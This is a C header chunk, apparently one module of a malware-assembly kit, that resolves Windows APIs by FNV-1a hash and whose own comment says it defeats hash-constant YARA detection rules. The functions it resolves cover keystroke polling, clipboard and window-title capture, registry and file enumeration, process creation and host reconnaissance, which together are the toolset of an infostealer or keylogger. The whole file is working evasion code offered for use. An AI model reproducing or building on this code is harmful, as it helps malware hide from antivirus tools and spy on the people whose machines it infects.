// chunk: api_resolve/api_hash_fnv1a
// depends: (none)
// provides: fnv1a_hash, resolve_api, api, resolve_all_apis
// headers: windows.h
// note: FNV-1a hash-based API resolution — different hash constants from DJB2/CRC32, defeats hash-constant YARA rules

#ifndef CHUNK_API_HASH_FNV1A
#define CHUNK_API_HASH_FNV1A

#include <windows.h>

static DWORD fnv1a_hash(const char *str) {
    DWORD h = 0x811C9DC5u;
    while (*str) {
        h ^= (BYTE)*str++;
        h *= 0x01000193u;
    }
    return h;
}

static FARPROC resolve_api(HMODULE mod, DWORD hash) {
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (fnv1a_hash(name) == hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

/* kernel32 */
typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD  (WINAPI *fn_GetFileAttributesA)(LPCSTR);
typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef BOOL   (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef void   (WINAPI *fn_Sleep)(DWORD);
typedef DWORD  (WINAPI *fn_GetTickCount)(void);
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *fn_FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fn_FindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fn_FindClose)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef DWORD  (WINAPI *fn_GetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
typedef void   (WINAPI *fn_GetNativeSystemInfo)(LPSYSTEM_INFO);
typedef BOOL   (WINAPI *fn_GetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef DWORD  (WINAPI *fn_GetLogicalDriveStringsA)(DWORD, LPSTR);
typedef UINT   (WINAPI *fn_GetDriveTypeA)(LPCSTR);
typedef void   (WINAPI *fn_GetLocalTime)(LPSYSTEMTIME);
typedef int    (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef int    (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef HMODULE(WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef DWORD  (WINAPI *fn_GetLastError)(void);
/* advapi32 */
typedef BOOL   (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef LONG   (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG   (WINAPI *fn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG   (WINAPI *fn_RegEnumValueA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG   (WINAPI *fn_RegEnumKeyExA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
typedef LONG   (WINAPI *fn_RegCloseKey)(HKEY);
/* user32 */
typedef BOOL   (WINAPI *fn_EnumWindows)(WNDENUMPROC, LPARAM);
typedef int    (WINAPI *fn_GetWindowTextA)(HWND, LPSTR, int);
typedef BOOL   (WINAPI *fn_OpenClipboard)(HWND);
typedef HANDLE (WINAPI *fn_GetClipboardData)(UINT);
typedef BOOL   (WINAPI *fn_CloseClipboard)(void);
typedef HWND   (WINAPI *fn_GetForegroundWindow)(void);
typedef SHORT  (WINAPI *fn_GetAsyncKeyState)(int);
typedef void   (WINAPI *fn_keybd_event)(BYTE, BYTE, DWORD, ULONG_PTR);
/* shell32 */
typedef HRESULT(WINAPI *fn_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
/* iphlpapi */
typedef ULONG  (WINAPI *fn_GetAdaptersInfo)(void*, PULONG);
typedef DWORD  (WINAPI *fn_GetExtendedTcpTable)(PVOID, PDWORD, BOOL, ULONG, int, ULONG);

/* Pre-computed FNV-1a hashes */
#define H_CreateFileA        0xBDCAC9CEu
#define H_ReadFile           0x54FCC943u
#define H_WriteFile          0x7F07C44Au
#define H_CloseHandle        0xFABA0065u
#define H_CreateProcessA     0x4A7C0A09u
#define H_CopyFileA          0x706946A9u
#define H_GetFileAttributesA 0xDA1A7563u
#define H_DeleteFileA        0x82417177u
#define H_CreatePipe         0x760DC161u
#define H_WaitForSingleObject 0x71948CA4u
#define H_GetFileSize        0x44ED8118u
#define H_GetTempPathA       0x5F59CFF1u
#define H_GetComputerNameA   0x446EAA3Cu
#define H_GetUserNameA       0x38A7C61Au
#define H_Sleep              0x2FA62CA8u
#define H_GetTickCount       0x0F4D8B55u
#define H_VirtualAlloc       0x03285501u
#define H_FindFirstFileA     0xD7482F55u
#define H_FindNextFileA      0x6F4D1398u
#define H_FindClose          0xDD35C6E6u
#define H_CreateDirectoryA   0xB0C98C53u
#define H_GetEnvironmentVariableA 0xC3D48B63u
#define H_GetNativeSystemInfo 0x9EF8EE4Du
#define H_GetDiskFreeSpaceExA 0x4602F4CAu
#define H_GetLogicalDriveStringsA 0xE61F6613u
#define H_GetDriveTypeA      0xC20FD77Cu
#define H_GetLocalTime       0x4268688Fu
#define H_MultiByteToWideChar 0x9053F9C2u
#define H_WideCharToMultiByte 0xE682DD7Eu
#define H_GetModuleHandleA   0xE463DA3Cu
#define H_GetLastError       0x5056DF37u
#define H_RegOpenKeyExA      0x0DF6A51Cu
#define H_RegQueryValueExA   0x9027EB7Cu
#define H_RegEnumValueA      0x7F1D5040u
#define H_RegEnumKeyExA      0xE5763A29u
#define H_RegCloseKey        0x1242154Au
#define H_EnumWindows        0x6D15BBBDu
#define H_GetWindowTextA     0x1E8B2273u
#define H_OpenClipboard      0x8BEB9585u
#define H_GetClipboardData   0x849D10E7u
#define H_CloseClipboard     0xDD5FCC0Bu
#define H_GetForegroundWindow 0x8FE07322u
#define H_GetAsyncKeyState   0x95466B05u
#define H_keybd_event        0x11DC8E6Du
#define H_SHGetFolderPathA   0xE8692330u
#define H_GetAdaptersInfo    0x040DABA3u
#define H_GetExtendedTcpTable 0xB8FB52C7u

static struct {
    /* kernel32 */
    fn_CreateFileA       pCreateFileA;
    fn_ReadFile          pReadFile;
    fn_WriteFile         pWriteFile;
    fn_CloseHandle       pCloseHandle;
    fn_CreateProcessA    pCreateProcessA;
    fn_CopyFileA         pCopyFileA;
    fn_GetFileAttributesA pGetFileAttributesA;
    fn_DeleteFileA       pDeleteFileA;
    fn_CreatePipe        pCreatePipe;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_GetFileSize       pGetFileSize;
    fn_GetTempPathA      pGetTempPathA;
    fn_GetComputerNameA  pGetComputerNameA;
    fn_Sleep             pSleep;
    fn_GetTickCount      pGetTickCount;
    fn_VirtualAlloc      pVirtualAlloc;
    fn_FindFirstFileA    pFindFirstFileA;
    fn_FindNextFileA     pFindNextFileA;
    fn_FindClose         pFindClose;
    fn_CreateDirectoryA  pCreateDirectoryA;
    fn_GetEnvironmentVariableA pGetEnvironmentVariableA;
    fn_GetNativeSystemInfo pGetNativeSystemInfo;
    fn_GetDiskFreeSpaceExA pGetDiskFreeSpaceExA;
    fn_GetLogicalDriveStringsA pGetLogicalDriveStringsA;
    fn_GetDriveTypeA     pGetDriveTypeA;
    fn_GetLocalTime      pGetLocalTime;
    fn_MultiByteToWideChar pMultiByteToWideChar;
    fn_WideCharToMultiByte pWideCharToMultiByte;
    fn_GetModuleHandleA  pGetModuleHandleA;
    fn_GetLastError      pGetLastError;
    /* advapi32 */
    fn_GetUserNameA      pGetUserNameA;
    fn_RegOpenKeyExA     pRegOpenKeyExA;
    fn_RegQueryValueExA  pRegQueryValueExA;
    fn_RegEnumValueA     pRegEnumValueA;
    fn_RegEnumKeyExA     pRegEnumKeyExA;
    fn_RegCloseKey       pRegCloseKey;
    /* user32 */
    fn_EnumWindows       pEnumWindows;
    fn_GetWindowTextA    pGetWindowTextA;
    fn_OpenClipboard     pOpenClipboard;
    fn_GetClipboardData  pGetClipboardData;
    fn_CloseClipboard    pCloseClipboard;
    fn_GetForegroundWindow pGetForegroundWindow;
    fn_GetAsyncKeyState pGetAsyncKeyState;
    fn_keybd_event     pkeybd_event;
    /* shell32 */
    fn_SHGetFolderPathA  pSHGetFolderPathA;
    /* iphlpapi */
    fn_GetAdaptersInfo   pGetAdaptersInfo;
    fn_GetExtendedTcpTable pGetExtendedTcpTable;
} api = {0};

static int resolve_all_apis(void) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE adv = LoadLibraryA("advapi32.dll");
    HMODULE u32 = LoadLibraryA("user32.dll");
    HMODULE sh32 = LoadLibraryA("shell32.dll");
    HMODULE iphlp = LoadLibraryA("iphlpapi.dll");
    if (!k32) return 0;

    /* kernel32 */
    api.pCreateFileA       = (fn_CreateFileA)resolve_api(k32, H_CreateFileA);
    api.pReadFile          = (fn_ReadFile)resolve_api(k32, H_ReadFile);
    api.pWriteFile         = (fn_WriteFile)resolve_api(k32, H_WriteFile);
    api.pCloseHandle       = (fn_CloseHandle)resolve_api(k32, H_CloseHandle);
    api.pCreateProcessA    = (fn_CreateProcessA)resolve_api(k32, H_CreateProcessA);
    api.pCopyFileA         = (fn_CopyFileA)resolve_api(k32, H_CopyFileA);
    api.pGetFileAttributesA = (fn_GetFileAttributesA)resolve_api(k32, H_GetFileAttributesA);
    api.pDeleteFileA       = (fn_DeleteFileA)resolve_api(k32, H_DeleteFileA);
    api.pCreatePipe        = (fn_CreatePipe)resolve_api(k32, H_CreatePipe);
    api.pWaitForSingleObject = (fn_WaitForSingleObject)resolve_api(k32, H_WaitForSingleObject);
    api.pGetFileSize       = (fn_GetFileSize)resolve_api(k32, H_GetFileSize);
    api.pGetTempPathA      = (fn_GetTempPathA)resolve_api(k32, H_GetTempPathA);
    api.pGetComputerNameA  = (fn_GetComputerNameA)resolve_api(k32, H_GetComputerNameA);
    api.pSleep             = (fn_Sleep)resolve_api(k32, H_Sleep);
    api.pGetTickCount      = (fn_GetTickCount)resolve_api(k32, H_GetTickCount);
    api.pVirtualAlloc      = (fn_VirtualAlloc)resolve_api(k32, H_VirtualAlloc);
    api.pFindFirstFileA    = (fn_FindFirstFileA)resolve_api(k32, H_FindFirstFileA);
    api.pFindNextFileA     = (fn_FindNextFileA)resolve_api(k32, H_FindNextFileA);
    api.pFindClose         = (fn_FindClose)resolve_api(k32, H_FindClose);
    api.pCreateDirectoryA  = (fn_CreateDirectoryA)resolve_api(k32, H_CreateDirectoryA);
    api.pGetEnvironmentVariableA = (fn_GetEnvironmentVariableA)resolve_api(k32, H_GetEnvironmentVariableA);
    api.pGetNativeSystemInfo = (fn_GetNativeSystemInfo)resolve_api(k32, H_GetNativeSystemInfo);
    api.pGetDiskFreeSpaceExA = (fn_GetDiskFreeSpaceExA)resolve_api(k32, H_GetDiskFreeSpaceExA);
    api.pGetLogicalDriveStringsA = (fn_GetLogicalDriveStringsA)resolve_api(k32, H_GetLogicalDriveStringsA);
    api.pGetDriveTypeA     = (fn_GetDriveTypeA)resolve_api(k32, H_GetDriveTypeA);
    api.pGetLocalTime      = (fn_GetLocalTime)resolve_api(k32, H_GetLocalTime);
    api.pMultiByteToWideChar = (fn_MultiByteToWideChar)resolve_api(k32, H_MultiByteToWideChar);
    api.pWideCharToMultiByte = (fn_WideCharToMultiByte)resolve_api(k32, H_WideCharToMultiByte);
    api.pGetModuleHandleA  = (fn_GetModuleHandleA)resolve_api(k32, H_GetModuleHandleA);
    api.pGetLastError      = (fn_GetLastError)resolve_api(k32, H_GetLastError);

    /* advapi32 */
    if (adv) {
        api.pGetUserNameA      = (fn_GetUserNameA)resolve_api(adv, H_GetUserNameA);
        api.pRegOpenKeyExA     = (fn_RegOpenKeyExA)resolve_api(adv, H_RegOpenKeyExA);
        api.pRegQueryValueExA  = (fn_RegQueryValueExA)resolve_api(adv, H_RegQueryValueExA);
        api.pRegEnumValueA     = (fn_RegEnumValueA)resolve_api(adv, H_RegEnumValueA);
        api.pRegEnumKeyExA     = (fn_RegEnumKeyExA)resolve_api(adv, H_RegEnumKeyExA);
        api.pRegCloseKey       = (fn_RegCloseKey)resolve_api(adv, H_RegCloseKey);
    }

    /* user32 */
    if (u32) {
        api.pEnumWindows       = (fn_EnumWindows)resolve_api(u32, H_EnumWindows);
        api.pGetWindowTextA    = (fn_GetWindowTextA)resolve_api(u32, H_GetWindowTextA);
        api.pOpenClipboard     = (fn_OpenClipboard)resolve_api(u32, H_OpenClipboard);
        api.pGetClipboardData  = (fn_GetClipboardData)resolve_api(u32, H_GetClipboardData);
        api.pCloseClipboard    = (fn_CloseClipboard)resolve_api(u32, H_CloseClipboard);
        api.pGetForegroundWindow = (fn_GetForegroundWindow)resolve_api(u32, H_GetForegroundWindow);
        api.pGetAsyncKeyState  = (fn_GetAsyncKeyState)resolve_api(u32, H_GetAsyncKeyState);
        api.pkeybd_event       = (fn_keybd_event)resolve_api(u32, H_keybd_event);
    }

    /* shell32 */
    if (sh32) {
        api.pSHGetFolderPathA  = (fn_SHGetFolderPathA)resolve_api(sh32, H_SHGetFolderPathA);
    }

    /* iphlpapi */
    if (iphlp) {
        api.pGetAdaptersInfo   = (fn_GetAdaptersInfo)resolve_api(iphlp, H_GetAdaptersInfo);
        api.pGetExtendedTcpTable = (fn_GetExtendedTcpTable)resolve_api(iphlp, H_GetExtendedTcpTable);
    }

    return (api.pCreateFileA != NULL);
}

#endif
